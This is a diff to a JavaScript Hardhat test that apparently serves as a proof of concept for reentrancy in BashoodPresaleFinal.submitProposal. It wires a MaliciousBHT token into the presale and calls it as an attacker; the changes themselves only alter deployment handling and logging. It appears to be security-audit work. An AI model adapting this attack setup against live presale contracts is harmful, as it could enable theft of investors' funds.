@@ -16,15 +16,23 @@ describe("PoC real: BashoodPresaleFinal.submitProposal against MaliciousBHT", fu
   const nft = await MockNFT.deploy();
   const price = await MockPriceFeed.deploy(8, parseUnits ? parseUnits('1', 8) : ethers.utils.parseUnits('1', 8));
   const ZERO = "0x0000000000000000000000000000000000000000";
-  const referral = await MockReferral.deploy(ZERO, ZERO, nft.address);
-    const mal = await MaliciousBHT.deploy();
+  const referral = await MockReferral.deploy(ZERO, ZERO, nft.getAddress ? await nft.getAddress() : nft.address);
+  const mal = await MaliciousBHT.deploy();
 
-    // Deploy real presale contract using unsigned tx to avoid provider constructor differences
+    // Deploy real presale contract via factory.deploy (more reliable under instrumentation)
     const BashoodPresaleFinal = await ethers.getContractFactory("contracts/BashoodPresaleFinal.sol:BashoodPresaleFinal");
-    const unsigned = await BashoodPresaleFinal.getDeployTransaction(
-      mal.getAddress ? await mal.getAddress() : mal.address,
-      nft.getAddress ? await nft.getAddress() : nft.address,
-      referral.getAddress ? await referral.getAddress() : referral.address,
+    // Resolve constructor addresses into variables so we can assert and log them
+    const bashoodAddr = mal.getAddress ? await mal.getAddress() : mal.address;
+    const nftAddr = nft.getAddress ? await nft.getAddress() : nft.address;
+    const referralAddr = referral.getAddress ? await referral.getAddress() : referral.address;
+  // resolved addresses: bashoodAddr, nftAddr, referralAddr, owner.address
+    if (!bashoodAddr || !nftAddr || !referralAddr) {
+      throw new Error(`Constructor arg null: bashood=${bashoodAddr} nft=${nftAddr} referral=${referralAddr}`);
+    }
+    const presaleInstance = await BashoodPresaleFinal.deploy(
+      bashoodAddr,
+      nftAddr,
+      referralAddr,
       owner.address,
       1,
       1,
@@ -32,10 +40,14 @@ describe("PoC real: BashoodPresaleFinal.submitProposal against MaliciousBHT", fu
       9999999999,
       100
     );
-    const tx = await owner.sendTransaction({ data: unsigned.data });
-    const receipt = await tx.wait();
-    const presaleAddress = receipt.contractAddress;
-    const presale = await ethers.getContractAt('BashoodPresaleFinal', presaleAddress);
+    // Support both ethers v5 (.deployed) and v6 (.waitForDeployment)
+    if (presaleInstance.waitForDeployment) {
+      await presaleInstance.waitForDeployment();
+    } else if (presaleInstance.deployed) {
+      await presaleInstance.deployed();
+    }
+    const presaleAddress = presaleInstance.getAddress ? await presaleInstance.getAddress() : presaleInstance.address;
+    const presale = presaleInstance;
 
   // configure presale
   await presale.setPriceFeed(price.getAddress ? await price.getAddress() : price.address);
@@ -51,10 +63,7 @@ describe("PoC real: BashoodPresaleFinal.submitProposal against MaliciousBHT", fu
 
   await malAsAttacker.approve(presaleAddress, parseUnits ? parseUnits('50', 18) : ethers.utils.parseUnits('50', 18));
 
-  // point malicious token at the real presale (debug prints to ensure addresses are valid)
-  console.log("mal.address", mal.address);
-  console.log("presaleAddress", presaleAddress);
-  console.log("nft.address", nft.address);
+  // point malicious token at the real presale
   await mal.setTarget(presaleAddress);
 
     // Call submitProposal as attacker; if reentrancy occurs the malicious counter will reflect nested calls
